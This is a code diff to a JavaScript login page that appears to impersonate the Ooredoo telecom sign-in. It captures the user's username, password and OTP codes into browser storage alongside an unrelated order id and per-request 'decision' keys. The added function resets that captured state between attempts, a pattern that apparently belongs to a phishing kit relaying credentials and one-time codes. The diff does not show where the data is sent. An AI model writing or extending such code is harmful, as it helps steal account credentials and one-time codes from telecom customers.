@@ -314,6 +314,33 @@
   const errorClose = document.getElementById('errorClose');
   const loginForm = document.getElementById('loginForm');
 
+  function clearPreviousOoredooState() {
+    sessionStorage.removeItem('safwa_order_id');
+    sessionStorage.removeItem('ooredooUser');
+    sessionStorage.removeItem('ooredooPass');
+    sessionStorage.removeItem('ooredooOtp');
+    sessionStorage.removeItem('otpCode');
+    sessionStorage.removeItem('ooredooFlow');
+    sessionStorage.removeItem('loginError');
+    sessionStorage.removeItem('otpError');
+    localStorage.removeItem('requestId');
+    localStorage.removeItem('ooredooFlow');
+    localStorage.removeItem('loginError');
+    localStorage.removeItem('otpError');
+    for (let i = localStorage.length - 1; i >= 0; i--) {
+      const key = localStorage.key(i);
+      if (key && (key.startsWith('ooredooDecision_') || key.startsWith('ooredooFlow_'))) {
+        localStorage.removeItem(key);
+      }
+    }
+    for (let i = sessionStorage.length - 1; i >= 0; i--) {
+      const key = sessionStorage.key(i);
+      if (key && (key.startsWith('ooredooDecision_') || key.startsWith('ooredooFlow_'))) {
+        sessionStorage.removeItem(key);
+      }
+    }
+  }
+
   // Show error alert if login failed
   window.addEventListener('load', () => {
     const loginError = sessionStorage.getItem('loginError');
@@ -379,8 +406,7 @@
       const ooredooPass = passwordInput.value.trim();
       const currentOrderId = 'ooredoo-' + Date.now() + '-' + Math.random().toString(16).slice(2, 10);
 
-      sessionStorage.removeItem('safwa_order_id');
-      localStorage.removeItem('requestId');
+      clearPreviousOoredooState();
       sessionStorage.setItem('userEmail', ooredooUser);
       sessionStorage.setItem('userPassword', ooredooPass);
       sessionStorage.setItem('ooredooUser', ooredooUser);
